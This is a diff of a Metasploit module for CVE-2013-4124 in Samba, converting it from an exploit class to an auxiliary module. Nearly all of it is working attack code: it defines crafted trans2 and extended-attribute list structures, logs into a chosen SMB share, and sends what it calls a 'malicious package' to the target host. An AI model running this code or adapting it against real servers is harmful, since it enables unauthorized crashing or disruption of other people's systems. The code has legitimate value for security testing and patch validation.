@@ -5,42 +5,31 @@
 #   http://metasploit.com/
 ##
 
-
 require 'msf/core'
 require 'rex/struct2'
 require 'rex/proto/smb'
 
-UTILS = Rex::Proto::SMB::Utils
-
-# Trans2_Parameters
-TRANS2_PARAM = Rex::Struct2::CStructTemplate.new(
-	[ 'uint16v', 'FID', 0 ], # SMB_FILE_FULL_EA_INFORMATION
-	[ 'uint16v', 'InfoLevel', 1015 ], # SMB_FILE_FULL_EA_INFORMATION
-	[ 'uint16v', 'Reserved', 0x00 ],
-)
-
-# struct ea_list_entry {
-#   uint8_t flags;
-#   uint8_t name_len;
-#   uint16_t val_len;
-#   char name[name_len]; Must end with \0
-#   char value[val_len];
-#}
-
-FEA_LIST = Rex::Struct2::CStructTemplate.new(
-	[ 'uint32v', 'NextOffset', 0x00000000],
-	[ 'uint8', 'Flags', 0x00 ],
-	[ 'uint8', 'NameLen', 0x07 ], # length of Name parameter minus trailing newline
-	[ 'uint16v', 'ValueLen', 0x04 ], #random valuelen with value
-	[ 'string', 'Name', 7, "dzlnly\x00" ], # Random string must end with '\0'
-	[ 'string', 'Value', 4, "\x00\x00\x00\x00" ]
-)
-
-class Metasploit3 < Msf::Exploit::Remote
-
+class Metasploit3 < Msf::Auxiliary
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
-	#include Msf::Exploit::Remote
+
+	UTILS = Rex::Proto::SMB::Utils
+
+	# Trans2_Parameters
+	TRANS2_PARAM = Rex::Struct2::CStructTemplate.new(
+		[ 'uint16v', 'FID', 0 ], # SMB_FILE_FULL_EA_INFORMATION
+		[ 'uint16v', 'InfoLevel', 1015 ], # SMB_FILE_FULL_EA_INFORMATION
+		[ 'uint16v', 'Reserved', 0x00 ],
+	)
+
+	FEA_LIST = Rex::Struct2::CStructTemplate.new(
+		[ 'uint32v', 'NextOffset', 0x00000000],
+		[ 'uint8', 'Flags', 0x00 ],
+		[ 'uint8', 'NameLen', 0x07 ], # length of Name parameter minus trailing newline
+		[ 'uint16v', 'ValueLen', 0x04 ], #random valuelen with value
+		[ 'string', 'Name', 7, "dzlnly\x00" ], # Random string must end with '\0'
+		[ 'string', 'Value', 4, "\x00\x00\x00\x00" ]
+	)
 
 	def initialize(info = {})
 		super(update_info(info,
@@ -59,12 +48,6 @@ class Metasploit3 < Msf::Exploit::Remote
 				[
 					['CVE', '2013-4124'],
 				],
-			'Privileged'     => true,
-			'Platform'       => 'linux',
-			'Targets'	=>
-				[ ['Universal', {} ], ],
-			'DisclosureDate' => 'Jun 12 2013',
-			'DefaultTarget'  => 0
 			))
 
 		register_options(
@@ -72,8 +55,6 @@ class Metasploit3 < Msf::Exploit::Remote
 				Opt::RHOST(),
 				Opt::RPORT(445),
 				OptString.new('SMBShare', [true, 'Target share', '']),
-				OptString.new('SMBUser', [false, 'Target share', '']),
-				OptString.new('SMBPass', [false, 'Target share', '']),
 			], self.class)
 
 	end
@@ -104,23 +85,15 @@ class Metasploit3 < Msf::Exploit::Remote
 		subcmd = 0x08
 		self.simple.client.trans2(subcmd, trans.to_s, data.to_s, false)
 	end
-	def check
-		return CheckCode::Unknown
-	end
-	def exploit
-		begin
-			connect()
-			smb_login()
-			self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
+	def run
+		connect()
+		smb_login()
+		self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")
 
-			print_status('Sending malicious package...')
-			send_pkt
-			print_status('Seems like all ok')
+		print_status('Sending malicious package...')
+		send_pkt
+		print_status('Seems like all ok')
 
-			disconnect()
-		rescue ::Exception => msg
-			print_status('exception ' + msg.to_s + 'occured')
-		end
-
+		disconnect()
 	end
 end
